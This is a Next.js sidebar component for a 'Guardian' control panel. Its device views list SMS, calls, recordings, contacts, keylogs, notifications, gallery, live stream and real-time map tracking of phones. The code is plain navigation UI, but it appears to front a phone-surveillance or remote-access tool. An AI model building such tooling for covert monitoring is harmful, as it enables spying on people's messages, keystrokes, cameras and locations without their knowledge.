'use client';

import Link from 'next/link';
import { useSearchParams, usePathname } from 'next/navigation';
import { Suspense, useState, useEffect } from 'react';
import {
    LayoutDashboard,
    Smartphone,
    MapPin,
    MessageSquare,
    Phone,
    Mic,
    Users,
    Keyboard,
    Bell,
    Image,
    LogOut,
    Shield,
    Menu,
    X,
    ChevronRight,
    Video,
} from 'lucide-react';
import { useAuthStore } from '@/lib/store';

const navItems = [
    { href: '/', label: 'Dashboard', icon: LayoutDashboard, description: 'Overview & stats' },
    { href: '/devices', label: 'Devices', icon: Smartphone, description: 'Manage all devices' },
    { href: '/map', label: 'Live Map', icon: MapPin, description: 'Real-time tracking' },
];

const deviceNavItems = [
    { href: '/sms', label: 'SMS', icon: MessageSquare },
    { href: '/calls', label: 'Calls', icon: Phone },
    { href: '/recordings', label: 'Recordings', icon: Mic },
    { href: '/contacts', label: 'Contacts', icon: Users },
    { href: '/keylogs', label: 'Keylogs', icon: Keyboard },
    { href: '/notifications', label: 'Notifications', icon: Bell },
    { href: '/gallery', label: 'Gallery', icon: Image },
    { href: '/stream', label: 'Live Stream', icon: Video },
];

export default function Sidebar() {
    return (
        <Suspense fallback={
            <aside className="fixed left-0 top-0 h-screen w-72 bg-white border-r border-[var(--border)] flex flex-col animate-pulse hidden lg:flex" />
        }>
            <SidebarContent />
        </Suspense>
    );
}

function SidebarContent() {
    const pathname = usePathname();
    const searchParams = useSearchParams();
    const currentDeviceId = searchParams.get('id');
    const { logout, user } = useAuthStore();
    const [mobileOpen, setMobileOpen] = useState(false);

    // Close mobile sidebar on route change
    useEffect(() => {
        setMobileOpen(false);
    }, [pathname]);

    // Close on escape key
    useEffect(() => {
        const handleEscape = (e: KeyboardEvent) => {
            if (e.key === 'Escape') setMobileOpen(false);
        };
        window.addEventListener('keydown', handleEscape);
        return () => window.removeEventListener('keydown', handleEscape);
    }, []);

    const isActive = (href: string) => {
        if (href === '/') return pathname === '/';
        return pathname.startsWith(href);
    };

    const SidebarInner = () => (
        <>
            {/* Logo */}
            <div className="p-6 border-b border-[var(--border)]">
                <div className="flex items-center gap-4">
                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[var(--primary)] to-[var(--primary-dark)] flex items-center justify-center shadow-lg shadow-[var(--primary-glow)]">
                        <Shield className="w-6 h-6 text-white" />
                    </div>
                    <div>
                        <h1 className="font-bold text-xl text-[var(--foreground)] tracking-tight">Guardian</h1>
                        <p className="text-xs text-[var(--muted)] font-medium">Control Panel</p>
                    </div>
                </div>
            </div>

            {/* Main Nav */}
            <nav className="flex-1 p-4 overflow-y-auto space-y-6 pt-6">
                <div>
                    <p className="px-4 text-[10px] font-semibold text-[var(--muted)] uppercase tracking-wider mb-3">
                        Navigation
                    </p>
                    <div className="space-y-1">
                        {navItems.map((item) => {
                            const Icon = item.icon;
                            const active = isActive(item.href);
                            return (
                                <Link
                                    key={item.href}
                                    href={item.href}
                                    className={`group flex items-center gap-3 px-4 py-3 rounded-xl transition-all duration-200 ${active
                                        ? 'bg-gradient-to-r from-[var(--primary)] to-[var(--primary-dark)] text-white shadow-md shadow-[var(--primary-glow)]'
                                        : 'text-[var(--muted)] hover:bg-[var(--background)] hover:text-[var(--foreground)]'
                                        }`}
                                >
                                    <div className={`w-9 h-9 rounded-xl flex items-center justify-center transition-all ${active
                                        ? 'bg-white/20'
                                        : 'bg-[var(--background)] group-hover:bg-[var(--primary-glow)]'
                                        }`}>
                                        <Icon className={`w-5 h-5 transition-transform duration-200 ${active ? '' : 'group-hover:scale-110'}`} />
                                    </div>
                                    <div className="flex-1">
                                        <span className="font-semibold text-sm block">{item.label}</span>
                                        <span className={`text-[10px] ${active ? 'text-white/70' : 'text-[var(--muted-light)]'}`}>
                                            {item.description}
                                        </span>
                                    </div>
                                    {active && <div className="w-1.5 h-1.5 rounded-full bg-white" />}
                                </Link>
                            );
                        })}
                    </div>
                </div>

                {/* Device Section - only show if on a device detail page */}
                {currentDeviceId && (
                    <div className="animate-fade-in">
                        <p className="px-4 text-[10px] font-semibold text-[var(--muted)] uppercase tracking-wider mb-3">
                            Device Data
                        </p>
                        <div className="space-y-1">
                            {deviceNavItems.map((item) => {
                                const Icon = item.icon;
                                const active = pathname.includes(item.href);
                                return (
                                    <Link
                                        key={item.href}
                                        href={`/devices/view/${item.href}/?id=${currentDeviceId}`}
                                        className={`group flex items-center gap-3 px-4 py-2.5 rounded-xl transition-all duration-200 ${active
                                            ? 'bg-[var(--primary-glow)] text-[var(--primary)] border border-[var(--primary)]/20'
                                            : 'text-[var(--muted)] hover:bg-[var(--background)] hover:text-[var(--foreground)]'
                                            }`}
                                    >
                                        <Icon className={`w-4 h-4 transition-transform duration-200 ${active ? 'scale-110' : 'group-hover:scale-110'}`} />
                                        <span className="font-medium text-sm">{item.label}</span>
                                        <ChevronRight className={`w-4 h-4 ml-auto transition-all ${active ? 'opacity-100' : 'opacity-0 group-hover:opacity-50'}`} />
                                    </Link>
                                );
                            })}
                        </div>
                    </div>
                )}
            </nav>

            {/* User Section */}
            <div className="p-4 border-t border-[var(--border)] bg-[var(--background)]">
                <div className="flex items-center justify-between p-3 rounded-2xl bg-white border border-[var(--border)] shadow-sm">
                    <div className="flex items-center gap-3">
                        <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-emerald-400 to-teal-500 flex items-center justify-center text-white font-bold text-sm shadow-md">
                            {user?.username?.charAt(0).toUpperCase() || 'A'}
                        </div>
                        <div className="overflow-hidden">
                            <p className="font-semibold text-sm text-[var(--foreground)] truncate">{user?.username || 'Admin'}</p>
                            <div className="flex items-center gap-1.5">
                                <span className="w-2 h-2 rounded-full bg-[var(--success)]" />
                                <span className="text-[10px] text-[var(--muted)] font-medium">Active</span>
                            </div>
                        </div>
                    </div>
                    <button
                        onClick={() => logout()}
                        className="p-2.5 rounded-xl hover:bg-red-50 text-[var(--muted)] hover:text-red-500 transition-all duration-200"
                        title="Logout"
                    >
                        <LogOut className="w-5 h-5" />
                    </button>
                </div>
            </div>
        </>
    );

    return (
        <>
            {/* Mobile Menu Button */}
            <button
                onClick={() => setMobileOpen(true)}
                className="fixed top-4 left-4 z-50 lg:hidden p-3 rounded-xl bg-white border border-[var(--border)] shadow-lg text-[var(--foreground)] hover:bg-[var(--background)] transition-all"
            >
                <Menu className="w-5 h-5" />
            </button>

            {/* Mobile Overlay */}
            <div
                className={`sidebar-overlay lg:hidden ${mobileOpen ? 'active' : ''}`}
                onClick={() => setMobileOpen(false)}
            />

            {/* Mobile Sidebar */}
            <aside className={`fixed left-0 top-0 h-screen w-72 bg-white border-r border-[var(--border)] flex flex-col z-50 lg:hidden transform transition-transform duration-300 ease-out ${mobileOpen ? 'translate-x-0' : '-translate-x-full'}`}>
                <button
                    onClick={() => setMobileOpen(false)}
                    className="absolute top-4 right-4 p-2 rounded-lg hover:bg-[var(--background)] text-[var(--muted)] transition-colors"
                >
                    <X className="w-5 h-5" />
                </button>
                <SidebarInner />
            </aside>

            {/* Desktop Sidebar */}
            <aside className="fixed left-0 top-0 h-screen w-72 bg-white border-r border-[var(--border)] flex-col z-40 hidden lg:flex shadow-xl shadow-black/[0.03]">
                <SidebarInner />
            </aside>
        </>
    );
}
